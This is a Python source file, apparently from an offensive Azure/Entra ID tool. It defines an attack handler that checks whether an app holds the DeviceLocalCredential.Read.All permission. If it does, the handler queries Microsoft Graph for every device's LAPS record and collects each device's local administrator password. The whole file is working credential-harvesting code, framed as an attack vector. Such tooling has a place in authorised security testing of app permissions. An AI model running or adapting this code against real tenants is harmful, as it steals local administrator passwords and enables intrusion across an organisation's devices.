from typing import List
from attacks.handlers.base_handler import AttackHandler, Request, Response
from utils import logger
import requests

logger = logger.createLogger('attacks.handlers.laps_handler')


class Laps_Handler(AttackHandler):
    def handle(self, request: Request,responses:List[Response]):
        # TODO map request.roles to fit with this attack
        if "DeviceLocalCredential.Read.All" in request.roles:
            logger.info('tid: %s, appid: %s may be vulnerable to laps vector' % (request.tenantId,request.appId))
            status = False
            attack_name = "DeviceLocalCredentialVectors"
            message = ""
            error = "DeviceLocalCredentialVectors - failed"
            logger.debug("DeviceLocalCredential.Read.All - Allows the app to read device local credential properties including passwords, without a signed-in user.")
            logger.debug("Attack vector - read laps.")
            try:
                create_message_URL = "https://graph.microsoft.com/beta/directory/deviceLocalCredentials"
                result = requests.get(create_message_URL, headers=request.request_headers)
                if result.status_code == 200:
                    json = result.json()
                    vals = json["value"]
                    for device in vals:
                        id = device["id"]
                        create_message_URL = "https://graph.microsoft.com/beta/directory/deviceLocalCredentials/" + id + "?$select=credentials"
                        result = requests.get(create_message_URL, headers=request.request_headers)
                        if result.status_code == 200:
                            json = result.json()
                            values = json["credentials"]
                            for creds in values:
                                message += " %s : %s\n" % (json["deviceName"], creds["passwordBase64"])
                                status = True
                if message == "":
                    message = error
            except:
                logger.error("Unexpected exception in laps_Handler function")

            
            responses.append(Response(attack_name,request.tenantId,request.appId,status,message))



        return super().handle(request,responses)
            
